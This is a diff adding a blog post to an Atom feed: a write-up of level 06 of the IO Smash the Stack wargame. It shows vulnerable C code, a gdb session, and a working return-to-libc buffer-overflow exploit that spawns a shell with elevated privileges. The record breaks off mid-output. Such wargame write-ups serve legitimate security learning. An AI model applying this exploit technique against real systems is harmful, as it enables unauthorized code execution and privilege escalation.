@@ -4,13 +4,164 @@
  <title>Álvaro Felipe Melchor</title>
  <link href="http://alvarofe.github.io/atom.xml" rel="self"/>
  <link href="http://alvarofe.github.io/"/>
- <updated>2014-12-18T22:51:20+01:00</updated>
+ <updated>2014-12-26T19:55:07+01:00</updated>
  <id>http://alvarofe.github.io</id>
  <author>
    <name>Álvaro Felipe Melchor</name>
    <email></email>
  </author>
 
+ 
+ <entry>
+   <title>Level 06 I/O Smash the Stack</title>
+   <link href="http://alvarofe.github.io/posts/level06iosmash"/>
+   <updated>2014-12-26T00:00:00+01:00</updated>
+   <id>http://alvarofe.github.io/posts/level06iosmash</id>
+   <content type="html">&lt;p&gt;Those days I have been playing a little bit with &lt;a href=&quot;http://io.smashthestack.org/&quot;&gt;IO Smash the Stack&lt;/a&gt;. By now I am in the level 8.&lt;/p&gt;
+
+&lt;p&gt;Today I will explain how I resolved the level06 and the process that I followed. In this level we have the code and it is more large than the previous.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-C&quot; data-lang=&quot;C&quot;&gt;&lt;span class=&quot;c1&quot;&gt;//written by bla&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;//inspired by nnp&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;LANG_ENGLISH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;LANG_FRANCAIS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;LANG_DEUTSCH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;language&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LANG_ENGLISH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UserRecord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;greetuser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UserRecord&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;greeting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;LANG_ENGLISH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;greeting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;Hi &amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;LANG_FRANCAIS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;greeting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;Bienvenue &amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;LANG_DEUTSCH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;greeting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;Willkommen &amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;strcat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;greeting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;greeting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;USAGE: %s [name] [password]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UserRecord&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;strncpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;strncpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;envlang&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;LANG&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;envlang&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;memcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;envlang&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;fr&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;language&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LANG_FRANCAIS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;memcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;envlang&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;de&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;language&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LANG_DEUTSCH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;greetuser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;What this code does is easy to understand and also it is easy to spot where the vulnerability resides. Is in the function &lt;code&gt;strcat&lt;/code&gt;. If we go to the &lt;code&gt;man page&lt;/code&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;The  strcat() function appends the src string to the dest string, overwriting the terminating null byte (&amp;#39;\0&amp;#39;) at the end of dest, and then adds a terminating null byte.  The strings may not overlap, and the dest string must have enough space for the result.  If dest is not large enough, program behavior is unpredictable; buffer overruns  are  a  favorite  avenue  for  attacking secure programs.&lt;/p&gt;
+
+&lt;p&gt;The strncat() function is similar, except that&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt; it will use at most n bytes from src; and&lt;/li&gt;
+&lt;li&gt; src does not need to be null-terminated if it contains n or more bytes.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Basically strcat will append the src string until we get the &lt;code&gt;\0&lt;/code&gt;. How we want to overflow the stack of greeting in the function &lt;code&gt;greetuser&lt;/code&gt; we should look how the stack looks like when this function is called. To find out we will use &lt;code&gt;gdb&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;disas greetuser
+Dump of assembler code &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; greetuser:
+   0x0804851c &amp;lt;+0&amp;gt;: push   ebp
+   0x0804851d &amp;lt;+1&amp;gt;: mov    ebp,esp
+   0x0804851f &amp;lt;+3&amp;gt;: sub    esp,0x58
+   0x08048522 &amp;lt;+6&amp;gt;: mov    eax,ds:0x8049964
+   0x08048527 &amp;lt;+11&amp;gt;:    cmp    eax,0x1
+   0x0804852a &amp;lt;+14&amp;gt;:    je     0x8048540 &amp;lt;greetuser+36&amp;gt;
+   0x0804852c &amp;lt;+16&amp;gt;:    cmp    eax,0x2
+   0x0804852f &amp;lt;+19&amp;gt;:    je     0x804855c &amp;lt;greetuser+64&amp;gt;
+   0x08048531 &amp;lt;+21&amp;gt;:    &lt;span class=&quot;nb&quot;&gt;test   &lt;/span&gt;eax,eax
+   0x08048533 &amp;lt;+23&amp;gt;:    jne    0x8048574 &amp;lt;greetuser+88&amp;gt;
+   0x08048535 &amp;lt;+25&amp;gt;:    lea    eax,&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp-0x48&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+   0x08048538 &amp;lt;+28&amp;gt;:    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;eax&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,0x206948
+   0x0804853e &amp;lt;+34&amp;gt;:    jmp    0x8048574 &amp;lt;greetuser+88&amp;gt;
+   0x08048540 &amp;lt;+36&amp;gt;:    lea    eax,&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp-0x48&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+   0x08048543 &amp;lt;+39&amp;gt;:    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;eax&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,0x6e656942
+   0x08048549 &amp;lt;+45&amp;gt;:    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;eax+0x4&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,0x756e6576
+   0x08048550 &amp;lt;+52&amp;gt;:    mov    WORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;eax+0x8&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,0x2065
+   0x08048556 &amp;lt;+58&amp;gt;:    mov    BYTE PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;eax+0xa&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,0x0
+   0x0804855a &amp;lt;+62&amp;gt;:    jmp    0x8048574 &amp;lt;greetuser+88&amp;gt;
+   0x0804855c &amp;lt;+64&amp;gt;:    lea    eax,&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp-0x48&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+   0x0804855f &amp;lt;+67&amp;gt;:    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;eax&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,0x6c6c6957
+   0x08048565 &amp;lt;+73&amp;gt;:    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;eax+0x4&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,0x6d6d6f6b
+   0x0804856c &amp;lt;+80&amp;gt;:    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;eax+0x8&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,0x206e65
+   0x08048573 &amp;lt;+87&amp;gt;:    nop
+   0x08048574 &amp;lt;+88&amp;gt;:    lea    eax,&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp+0x8&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+   0x08048577 &amp;lt;+91&amp;gt;:    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp+0x4&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,eax
+   0x0804857b &amp;lt;+95&amp;gt;:    lea    eax,&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp-0x48&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+   0x0804857e &amp;lt;+98&amp;gt;:    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,eax
+   0x08048581 &amp;lt;+101&amp;gt;:   call   0x80483d0 &amp;lt;strcat@plt&amp;gt;
+   0x08048586 &amp;lt;+106&amp;gt;:   lea    eax,&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp-0x48&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+   0x08048589 &amp;lt;+109&amp;gt;:   mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,eax
+   0x0804858c &amp;lt;+112&amp;gt;:   call   0x80483f0 &amp;lt;puts@plt&amp;gt;
+   0x08048591 &amp;lt;+117&amp;gt;:   leave
+   0x08048592 &amp;lt;+118&amp;gt;:   ret
+End of assembler dump.
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;b * 0x0804857e  &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Breakpoint before to call strcat
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;r AAAAAAAAAAAAAAAA BBBBBBBBBBBBBBB 
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;x/64xw &lt;span class=&quot;nv&quot;&gt;$esp&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/public/images/stackio6.png&quot; alt=&quot;stackio6&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;To exploit this we are going to use the technique &lt;a href=&quot;http://insecure.org/sploits/linux.libc.return.lpr.sploit.html&quot;&gt;Return Into Lib C&lt;/a&gt;. What we have to do is overwrite the return address &lt;code&gt;0x080486af&lt;/code&gt; with the system address and then build a fake stack such that when we resume the execution at the direction of system it sees a valid stack. It would be as simple as put the direction of exit followed by the direction of the string &lt;code&gt;/bin/sh&lt;/code&gt;. All these directions can be uncovered with &lt;code&gt;gdb&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;p system
+&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 0xb7ea9c30 &amp;lt;system&amp;gt;
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;p &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 0xb7e9d270 &amp;lt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&amp;gt;
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchmem /bin/sh
+Searching &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/bin/sh&amp;#39;&lt;/span&gt; in: None ranges
+Found &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; results, display max &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; items:
+libc : 0xb7faafb4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;So the beginning of the &lt;code&gt;argv[1]&lt;/code&gt; must be the direction of &lt;code&gt;
+exit&lt;/code&gt; and then the direction of the string &lt;code&gt;/bin/sh&lt;/code&gt; followed by as much data as needed until we reach the return address to overwrite it with the direction of system. To exploit it more easily is better use as language &lt;code&gt;FRANCAIS&lt;/code&gt; or &lt;code&gt;DEUTSCH&lt;/code&gt; since that will fill the &lt;code&gt;greeting&lt;/code&gt; variable with more data. Since with the &lt;code&gt;english&lt;/code&gt; version the &lt;code&gt;id&lt;/code&gt; was initialize to &lt;code&gt;0&lt;/code&gt; making the strcat function stopping when it reaches that value.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;level6@io:/levels&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LANG&lt;/span&gt;
+en_GB.UTF-8
+level6@io:/levels&lt;span class=&quot;nv&quot;&gt;$ LANG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;de_GB.UTF-8
+level6@io:/levels&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LANG&lt;/span&gt;
+de_GB.UTF-8
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;And finally we get a fresh shell calling it as follows.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;level6@io:/levels&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./level06 &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;python -c &lt;span class=&quot;s1&quot;&gt;&amp;#39;print &amp;quot;\x70\xd2\xe9\xb7&amp;quot; + &amp;quot;\xb4\xaf\xfa\xb7&amp;quot; + &amp;quot;A&amp;quot;*32&amp;#39;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;python -c &lt;span class=&quot;s1&quot;&gt;&amp;#39;print &amp;quot;B&amp;quot;*25 + &amp;quot;\x30\x9c\xea\xb7&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+Willkommen p�鷴��AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBB0��
+sh-4.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;id
+&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1006&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;level6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1006&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;level6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;euid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1007&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;level7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1007&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;level7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1006&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;level6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1029&lt;span 